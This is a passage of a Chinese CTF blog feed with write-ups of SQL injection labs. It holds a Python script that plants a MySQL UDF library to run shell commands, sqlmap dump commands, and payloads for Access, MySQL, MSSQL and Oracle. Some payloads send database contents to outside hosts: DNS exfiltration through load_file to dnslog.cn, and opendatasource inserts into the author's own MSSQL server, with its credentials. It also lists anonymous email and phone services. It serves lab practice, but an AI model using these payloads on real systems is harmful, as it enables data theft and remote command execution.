class="string">'d'</span>]</span><br><span class="line"></span><br><span class="line">udf=<span class="string">""</span></span><br><span class="line">udf_text=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20000</span>,<span class="number">5000</span>):</span><br><span class="line">    end = i+<span class="number">5000</span></span><br><span class="line">    udf_text.append(udf[i:end])</span><br><span class="line"></span><br><span class="line">p = dict(zip(text,udf_text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> text:</span><br><span class="line">    param=payload.format(p[t],t)</span><br><span class="line">    get_url = url + param</span><br><span class="line">    res = requests.get(get_url)</span><br><span class="line">    print(<span class="string">"[*]"</span>,end=<span class="string">""</span>)</span><br><span class="line">    code = res.status_code</span><br><span class="line">    print(code,end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span>  code==<span class="number">404</span>:</span><br><span class="line">        print(<span class="string">"你输入的URL可能出错"</span>)</span><br><span class="line">    acq=acquire.format(t)</span><br><span class="line">    data=url+acq</span><br><span class="line">    res = requests.get(url=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"load_file"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">"--&gt;成功插入&#123;&#125;.txt"</span>.format(t))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]导入udf.so成功"</span>)</span><br><span class="line">url_sys_dll = <span class="string">"?id=1%27;select unhex(concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'))) into dumpfile '/usr/lib/mariadb/plugin/udf.so' --+"</span></span><br><span class="line">res= requests.get(url=url+url_sys_dll)</span><br><span class="line">print(<span class="string">"[*]创建函数sys_eval()成功"</span>)</span><br><span class="line">url_sys_function = <span class="string">"?id=1%27;create function sys_eval returns string soname 'udf.so'--+"</span></span><br><span class="line">res= requests.get(url=url+url_sys_function)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]命令执行结果: "</span>)</span><br><span class="line">sys_eval=<span class="string">"?id=';select sys_eval('cat /flag.*')--+"</span></span><br><span class="line">res= requests.get(url=url+sys_eval)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803114942859.png" alt="image-20210803114942859"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>UDF</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】数据库注入 wp</title>
    <url>/posts/67.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场数据库注入，练练手！</li>
</ul>
</blockquote>
<h1 id="Access——Cookie注入"><a href="#Access——Cookie注入" class="headerlink" title="Access——Cookie注入"></a>Access——Cookie注入</h1><blockquote>
<ul>
<li>环境<a href="http://59.63.200.79:8004/" target="_blank" rel="noopener">http://59.63.200.79:8004/</a></li>
</ul>
</blockquote>
<ul>
<li><strong>正常情况Cookie注入是可以通过post传参测试的</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725200344696.png" alt="image-20210725200344696"></p>
</blockquote>
<ul>
<li><strong>上面通过改id的参数发现可以cookie注入，废话不多说，抓包，sqlmap走起</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725200630878.png" alt="image-20210725200630878"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725200659338.png" alt="image-20210725200659338"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -r 123.txt --batch --threads&#x3D;10 -T admin --dump</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725200724841.png" alt="image-20210725200724841"></p>
</blockquote>
<ul>
<li>MD5解密b9a2a2b5dffb918c ——&gt; welcome直接登录管理员账号</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210725200831155.png" alt="image-20210725200831155"></p>
</blockquote>
<ul>
<li><p>突然看到这个决定还是尝试下手注，字段明显有10个<img src="https://gylq.gitee.io/cloudimages/img/image-20210725205236332.png" alt="image-20210725205236332"></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727100704096.png" alt="image-20210727100704096"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727100353504.png" alt=""></p>
</blockquote>
</li>
<li><p><strong>对了，Access表的查询语法必须包含表，不然就语法不对，所以得用exist爆破表，我这里先猜表里有admin，可以看到有好几个注入点</strong></p>
</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727101111543.png" alt="image-20210727101111543"></p>
<ul>
<li><strong>试着爆出表，利用exists来判断表是否存在</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select 1 and exists(select * from pre_ucenter_members);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727101643530.png" alt="image-20210727101643530"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727101802406.png" alt="image-20210727101802406"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727101850429.png" alt="image-20210727101850429"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727102540727.png" alt="image-20210727102540727"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727104830506.png" alt="image-20210727104830506"></p>
</blockquote>
<ul>
<li>MD5解密，密码welcome，然后和上一个方式一样搞就行</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727104930893.png" alt="image-20210727104930893"></p>
<h1 id="Access——Cookie偏移注入"><a href="#Access——Cookie偏移注入" class="headerlink" title="Access——Cookie偏移注入"></a>Access——Cookie偏移注入</h1><blockquote>
<ul>
<li>环境：<a href="http://59.63.200.79:8004/" target="_blank" rel="noopener">http://59.63.200.79:8004/</a></li>
<li><strong>偏移注入原理：当我们知道一个表名后，比如 admin表，我们就可以用 admin. <em>来表示 admin 当中的所有字段。 admin.</em> =&gt; usernme,password,id (admin表里面所有的字段)。当这个操作可以实现的时候，就表示存在偏移注入。然后我们可以判断字段数，找出回显点，把admin表里面的字段，一个一个往回显点上套，就可以显示出我们需要的数据。</strong></li>
</ul>
</blockquote>
<ul>
<li>首先这个页面的字段数有26个</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727105618503.png" alt="image-20210727105618503"></p>
</blockquote>
<ul>
<li>然后我测出admin表中有16个字段</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727110027370.png" alt="image-20210727110027370"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727110046977.png" alt="image-20210727110046977"></p>
</blockquote>
<ul>
<li><strong>也就是说26-16=10,admin表要从第11个开始</strong></li>
<li><strong>记得要加admin表，Access数据库不支持不带表查询</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727110450271.png" alt="image-20210727110450271"></p>
</blockquote>
<ul>
<li>找到回显点</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727110604395.png" alt="image-20210727110604395"></p>
</blockquote>
<ul>
<li><strong>放在1前面，可以显示4个admin的数据</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">105 union select admin.*,1,2,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727110946423.png" alt="image-20210727110946423"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727111004237.png" alt="image-20210727111004237"></p>
<h1 id="Mysql——DNS注入"><a href="#Mysql——DNS注入" class="headerlink" title="Mysql——DNS注入"></a>Mysql——DNS注入</h1><blockquote>
<ul>
<li>环境<a href="http://59.63.200.79:8014/index3.php" target="_blank" rel="noopener">http://59.63.200.79:8014/index3.php</a></li>
</ul>
</blockquote>
<ul>
<li><strong>一打开发现就直接waf拦截</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727111835964.png" alt="image-20210727111835964"></p>
</blockquote>
<ul>
<li><strong>发现是个老版本的waf，可以用.txt来绕过</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727111926528.png" alt="image-20210727111926528"></p>
</blockquote>
<ul>
<li><strong>然后就是常规的注入测试了，为2个字段</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727112021707.png" alt="image-20210727112021707"></p>
<ul>
<li><strong>但是发现报错不回显，只能思考盲注了，sleep明显刷了5秒，所以是时间盲注，但是题目提醒是DNS注入，所以</strong></li>
<li>地址：<a href="http://dnslog.cn" target="_blank" rel="noopener">http://dnslog.cn</a> 获取地址</li>
</ul>
<blockquote>
<ul>
<li>漏洞原理</li>
<li><strong>Dns注入 =&gt; 让盲注变成显错注入</strong></li>
<li><strong>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把想获得的数据外带出来。</strong></li>
<li><strong>对于sql盲注，常见的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。</strong></li>
<li><strong>所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727113838870.png" alt="image-20210727113838870"></p>
<ul>
<li><strong>DNS日志记录会返回我们请求的数据信息</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727114028775.png" alt="image-20210727114028775"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727114034885.png" alt="image-20210727114034885"></p>
<ul>
<li><strong>测试一下load_file直接访问dns解析来获取地址</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">load_file('//demo.uf7elz.dnslog.cn/abc')</span><br><span class="line">//就是UNC路径访问共享demo.uf7elz.dnslog.cn的服务器下的共享文件夹abc</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727115110606.png" alt="image-20210727115110606"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727115450751.png" alt="image-20210727115450751"></p>
</blockquote>
<blockquote>
<ul>
<li><strong>注意一点，自测的时候，load_file是需要单独开启的，否则是无法使用的</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>构造一个语句来报错注入，利用concat连接起来，查数据库</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8014/index3.php/1.txt?id=1  and load_file(concat('//',(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'.uf7elz.dnslog.cn/abc'</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727115858391.png" alt="image-20210727115858391"></p>
</blockquote>
<ul>
<li>就直接查表</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8014/index3.php/1.txt?id=1  and load_file(concat('//',(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.l6xxex.dnslog.cn/abc'</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727120502224.png" alt="image-20210727120502224"></p>
</blockquote>
<ul>
<li>看看还有没有其他的表，抓包</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727121114294.png" alt="image-20210727121114294"></p>
</blockquote>
<ul>
<li>跑一下</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727121138558.png" alt="image-20210727121138558"></p>
</blockquote>
<ul>
<li>就admin有用，那就看看admin 的字段</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8014/index3.php/1.txt?id=1  and load_file(concat('//',(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'admin'</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="string">'.l6xxex.dnslog.cn/abc'</span>))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727121350422.png" alt="image-20210727121350422"></p>
<ul>
<li>查flag</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8014/index3.php/1.txt?id=1  and load_file(concat('//',(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">admin</span>),<span class="string">'.l6xxex.dnslog.cn/abc'</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727121618906.png" alt="image-20210727121618906"></p>
</blockquote>
<ul>
<li><strong>总结一下，虽然可以很简单的把盲注变报错注入，但是条件不是很理想。首先目标得带有SMB服务（共享文件），windows自带，linux不自带，目标得有网络。还得开启了文件读取的函数功能。</strong></li>
</ul>
<h1 id="MSSQL——显错注入和反弹注入"><a href="#MSSQL——显错注入和反弹注入" class="headerlink" title="MSSQL——显错注入和反弹注入"></a>MSSQL——显错注入和反弹注入</h1><blockquote>
<ul>
<li>环境 <a href="http://59.63.200.79:8015/?id=1" target="_blank" rel="noopener">http://59.63.200.79:8015/?id=1</a></li>
<li>这个靶场存在两种方式的注入。</li>
<li>第一种是显错注入形式</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>需要严格注意的是MSSQL中对数据类型有严格的要求，猜测输出点的时候填充点用NULL填充</strong></li>
</ul>
</blockquote>
<ul>
<li>判断字段</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727142735390.png" alt="image-20210727142735390"></p>
</blockquote>
<ul>
<li><strong>判断填充数据类型</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727142836484.png" alt="image-20210727142836484"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727142912612.png" alt="image-20210727142912612"></p>
</blockquote>
<ul>
<li><strong>查表名</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1' union all <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'2'</span>,table_name <span class="keyword">from</span> information_schema.tables<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727143027982.png" alt="image-20210727143027982"></p>
</blockquote>
<ul>
<li><strong>查字段</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1' union all <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'2'</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727143117122.png" alt="image-20210727143117122"></p>
</blockquote>
<ul>
<li><strong>拿flag</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1' union all <span class="keyword">select</span> <span class="number">1</span>,token,passwd <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727143230021.png" alt="image-20210727143230021"></p>
</blockquote>
<ul>
<li><strong>第二种方式是采用反弹注入中利用堆叠注入多语句执行</strong></li>
</ul>
<blockquote>
<ul>
<li><strong>定义:存在SQL注入点却无法进行注入、注入工具猜解的速度异常缓慢、错误提示信息关闭、无法返回注入结果等，可以使用反弹注入来进行解决</strong></li>
<li><strong>原理：反弹注入需要依赖于函数opendatasource的支持，将当前数据库中的查询结果发送到另一数据库服务器中，从而获取目标服务器中数据库信息</strong></li>
<li><strong>堆叠注入</strong><ol>
<li><strong>分号（;）是用来表示一条sql语句的结束</strong></li>
<li><strong>多条SQL语句同时执行，可以执行任意语句，不用只局限于一种类型的语句</strong></li>
</ol>
</li>
<li><strong>反弹注入的条件</strong><ol>
<li><strong>有SQL注入，漏洞</strong></li>
<li><strong>外部数据库得插进去（我们要有一个外部数据库）[搭建一个MSSQL的数据库] 公网ip [一台有公网ip的MSSQL数据库]</strong></li>
</ol>
</li>
</ul>
</blockquote>
<blockquote>
<p><strong>MSSQL注入 — 反弹注入实际就是把查询出来的数据发送到我们的MSSQL服务器上，那么我们需要自己的MSSQL数据库和一个公网IP</strong></p>
<p><strong>免费资源：虚拟空间</strong>——在虚拟空间中开启MSSQL然后直接使用，可以免去MSSQL安装环境并且不需要特意购置云服务器来获取一个公网IP。虚拟空间也可以搭建网站和个人博客，有兴趣可以去尝试！</p>
</blockquote>
<blockquote>
<ol>
<li><strong>香港云<a href="http://www.webweb.com" target="_blank" rel="noopener">http://www.webweb.com</a>  随便拿个邮箱然后注册就行（免费60天的试用，过期了就换个邮箱（惊奇的发现匿名邮箱也可以））</strong></li>
<li><strong>香港云如果失效用这个：<a href="https://my.gearhost.com/CloudSite、http://mssqlus.webweb.com/" target="_blank" rel="noopener">https://my.gearhost.com/CloudSite、http://mssqlus.webweb.com/</a> （数据库操作)</strong></li>
<li><strong>临时邮箱：<a href="https://rootsh.com/" target="_blank" rel="noopener">https://rootsh.com/</a></strong></li>
<li><strong>匿名电话号码：<a href="https://yunduanxin.net/" target="_blank" rel="noopener">https://yunduanxin.net/</a></strong></li>
</ol>
</blockquote>
<ol>
<li><strong>环境准备</strong></li>
</ol>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727150456648.png" alt="image-20210727150456648"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727150913263.png" alt="image-20210727150913263"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727150847416.png" alt="image-20210727150847416"></p>
</blockquote>
<ol start="2">
<li><strong>如果连接navicat连接报错，去该软件下载目录找到这个安装</strong></li>
</ol>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727151753335.png" alt="image-20210727151753335"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727151816489.png" alt="image-20210727151816489"></p>
</blockquote>
<ol start="3">
<li><strong>连接成功后可以开始了</strong></li>
</ol>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727151918688.png" alt="image-20210727151918688"></p>
</blockquote>
<ol start="4">
<li><strong>构建sql连接语句</strong></li>
</ol>
<blockquote>
<ul>
<li><p>确认我的<strong>环境数据</strong></p>
</li>
<li><p>MSSQL服务器</p>
</li>
<li><p><strong>数据库服务器URL：SQL5095.site4now.net</strong></p>
</li>
<li><p><strong>数据库名称：DB_14DC16C_gylq</strong></p>
</li>
<li><p><strong>用户名：DB_14DC16C_gylq_admin</strong></p>
</li>
<li><p><strong>密码：12345678</strong></p>
</li>
</ul>
</blockquote>
<ul>
<li>查表和原理</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727154307488.png" alt="image-20210727154307488"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1';<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=SQL5095.site4now.net,1433;uid=DB_14DC16C_gylq_admin;pwd=12345678;database=DB_14DC16C_gylq'</span>).DB_14DC16C_gylq.dbo.test <span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>​    <img src="https://gylq.gitee.io/cloudimages/img/image-20210727154120809.png" alt="image-20210727154120809"></p>
</blockquote>
<ul>
<li><strong>接着按f5刷新一下就出现结果了</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727154145501.png" alt="image-20210727154145501"></p>
</blockquote>
<ul>
<li><strong>查字段</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1';<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=SQL5095.site4now.net,1433;uid=DB_14DC16C_gylq_admin;pwd=12345678;database=DB_14DC16C_gylq'</span>).DB_14DC16C_gylq.dbo.test <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727154653257.png" alt="image-20210727154653257"></p>
</blockquote>
<ul>
<li><strong>查flag，创建四个字段，执行以下语句，然后navicat刷新一下就好</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1';<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=SQL5095.site4now.net,1433;uid=DB_14DC16C_gylq_admin;pwd=12345678;database=DB_14DC16C_gylq'</span>).DB_14DC16C_gylq.dbo.test <span class="keyword">select</span> <span class="keyword">id</span>,username,passwd,token <span class="keyword">from</span> <span class="keyword">admin</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727155032276.png" alt="image-20210727155032276"></p>
<h1 id="Oracle——报错注入和显错注入"><a href="#Oracle——报错注入和显错注入" class="headerlink" title="Oracle——报错注入和显错注入"></a>Oracle——报错注入和显错注入</h1><blockquote>
<p>练习环境：<a href="http://59.63.200.79:8808/index_x.php" target="_blank" rel="noopener">http://59.63.200.79:8808/index_x.php</a>  （这里面可以试炼一下oracle语句）</p>
<p>环境：<a href="http://59.63.200.79:8808/" target="_blank" rel="noopener">http://59.63.200.79:8808/</a></p>
</blockquote>
<ul>
<li>练习环境学习下oracle语法</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727161314673.png" alt="image-20210727161314673"></p>
</blockquote>
<ul>
<li>虚表</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727161350132.png" alt="image-20210727161350132"></p>
</blockquote>
<ul>
<li>查询出所有的表 </li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727161434158.png" alt="image-20210727161434158"></p>
</blockquote>
<ul>
<li><strong>所以想要注入orcle的表就不能用information了，用all_tables，举个例子</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727161543428.png" alt="image-20210727161543428"></p>
</blockquote>
<ul>
<li><strong>查当前用户的所有表</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_tables</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727161644899.png" alt="image-20210727161644899"></p>
<ul>
<li><strong>查询出所有字段</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> all_tab_columns</span><br></pre></td></tr></table></figure></div>

<ul>
<li>查询出当前用户所有字段</li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727162236319.png" alt="image-20210727162236319"></p>
<ul>
<li>查版本</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> v$<span class="keyword">version</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727162329476.png" alt="image-20210727162329476"></p>
<ul>
<li><strong>为了等下做准备，rownum也需要使用（限制查询返回的总行数）</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727162448565.png" alt="image-20210727162448565"></p>
<ul>
<li><strong>上面只用于数据少的情况，如果要看第二行就得利用&lt;&gt;不等号，oracle还区分大小写</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span> <span class="keyword">and</span> column_name&lt;&gt;<span class="string">'UNAME'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727162716588.png" alt="image-20210727162716588"></p>
<ul>
<li><strong>或者用别名法，来探查其他数据</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> column_name, <span class="keyword">rownum</span> n <span class="keyword">from</span> user_tab_columns) <span class="keyword">where</span> n=<span class="number">2</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727163216170.png" alt="image-20210727163216170"></p>
<blockquote>
<ul>
<li><strong>根据上面的知识，这题虽然提示是用报错注入做，但是也可以用显错注入做。先用显错注入做一下</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>测有四个字段</strong></li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727164703762.png" alt="image-20210727164703762"></p>
</blockquote>
<ul>
<li><strong>测每个字段的数据类型和mssql数据库一样严谨，用null填充</strong></li>
</ul>
<blockquote>
<ul>
